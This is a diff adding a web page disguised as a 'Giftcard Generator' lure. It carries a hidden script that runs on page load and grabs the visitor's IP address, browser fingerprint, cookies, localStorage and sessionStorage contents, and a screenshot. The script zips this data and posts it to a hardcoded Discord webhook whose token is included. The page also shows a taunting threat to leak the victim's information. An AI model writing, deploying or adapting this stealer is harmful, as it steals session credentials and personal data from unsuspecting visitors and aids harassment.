@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giftcard Generator</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Giftcard Generator">
+    <meta property="og:description" content="Generate Giftcards FAST with v4lc.">
+    <meta property="og:image" content="https://example.com/path/to/your/image.jpg"> <!-- Optional: Add a URL to an image for the preview -->
+    <meta property="og:url" content="https://example.com"> <!-- Optional: Add your URL here -->
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+            overflow: hidden; /* Prevent scrollbars from appearing */
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .flashing-text {
+            font-size: 2em;
+            font-weight: bold;
+            animation: flash 1s infinite;
+        }
+
+        .hue-rotating-text {
+            font-size: 1.5em;
+            font-weight: bold;
+            animation: hueRotate 3s infinite;
+        }
+
+        @keyframes flash {
+            0% { color: black; }
+            50% { color: red; }
+            100% { color: black; }
+        }
+
+        @keyframes hueRotate {
+            0% { color: white; }
+            100% { color: hsl(360, 100%, 50%); }
+        }
+
+        #info {
+            display: none; /* Hide the info message by default */
+        }
+
+        /* Style for the hidden video */
+        #background-video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none; /* Prevent interaction */
+            top: -9999px; /* Move it off-screen */
+        }
+    </style>
+</head>
+<body>
+    <!-- Invisible Background Video -->
+    <video id="background-video" autoplay loop muted>
+        <source src="music.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="container">
+        <div class="flashing-text">V4lc</div>
+        <div class="hue-rotating-text">Say V4lc Runs You or ur info is everywhere</div>
+    </div>
+
+    <div id="info">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js"></script>
+        <script>
+            function generateUniqueId() {
+                return 'user-' + Math.random().toString(36).substr(2, 9);
+            }
+
+            async function getIpAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP address:', error);
+                    return 'Unable to retrieve IP address';
+                }
+            }
+
+            function getBrowserInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    viewportWidth: window.innerWidth,
+                    viewportHeight: window.innerHeight,
+                    deviceMemory: navigator.deviceMemory || 'Not available',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
+                    platform: navigator.platform,
+                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    javaEnabled: navigator.javaEnabled(),
+                    cookieEnabled: navigator.cookieEnabled,
+                    appName: navigator.appName,
+                    appVersion: navigator.appVersion,
+                    vendor: navigator.vendor,
+                    product: navigator.product,
+                    geolocation: 'Not available', // Geolocation requires user permission
+                    touchSupport: 'Not available', // Touch support information
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    } : 'Not available',
+                    plugins: Array.from(navigator.plugins).map(plugin => ({
+                        name: plugin.name,
+                        version: plugin.version,
+                        description: plugin.description
+                    })),
+                    screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
+                    fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
+                    cookies: document.cookie,
+                    localStorage: Object.keys(localStorage).reduce((obj, key) => {
+                        obj[key] = localStorage.getItem(key);
+                        return obj;
+                    }, {}),
+                    sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => {
+                        obj[key] = sessionStorage.getItem(key);
+                        return obj;
+                    }, {}),
+                    indexedDB: 'Not available', // IndexedDB requires specific queries
+                    webSQL: 'Not available', // WebSQL requires specific queries
+                };
+            }
+
+            async function captureScreenshot() {
+                try {
+                    const canvas = await html2canvas(document.body, {
+                        scale: window.devicePixelRatio
+                    });
+                    return canvas.toDataURL('image/png');
+                } catch (error) {
+                    console.error('Error capturing screenshot:', error);
+                    return null;
+                }
+            }
+
+            async function createZipFile(info, screenshotDataUrl) {
+                const zip = new JSZip();
+                zip.file('info.txt', JSON.stringify(info, null, 2));
+                
+                if (screenshotDataUrl) {
+                    const base64Data = screenshotDataUrl.split(',')[1];
+                    const imgBlob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/png' });
+                    zip.file('screenshot.png', imgBlob);
+                }
+                
+                zip.file('cookies.txt', info.cookies);
+
+                const content = await zip.generateAsync({ type: 'blob' });
+                return content;
+            }
+
+            async function sendZipToDiscord(zipBlob, uniqueId) {
+                const formData = new FormData();
+                formData.append('file', zipBlob, 'info.zip');
+                formData.append('uniqueId', uniqueId); // Append the unique identifier
+
+                try {
+                    await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('Zip file sent to Discord webhook');
+                } catch (error) {
+                    console.error('Error sending zip file to Discord webhook:', error);
+                }
+            }
+
+            async function initialize() {
+                const uniqueId = generateUniqueId(); // Generate unique identifier
+                const ip = await getIpAddress();
+                const browserInfo = getBrowserInfo();
+                browserInfo.ip = ip;
+                browserInfo.uniqueId = uniqueId; // Add unique identifier to info
+
+                const screenshotDataUrl = await captureScreenshot();
+                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
+                await sendZipToDiscord(zipBlob, uniqueId);
+            }
+
+            // Run the initialization function when the page loads
+            window.onload = initialize;
+        </script>
+    </div>
+</body>
+</html>
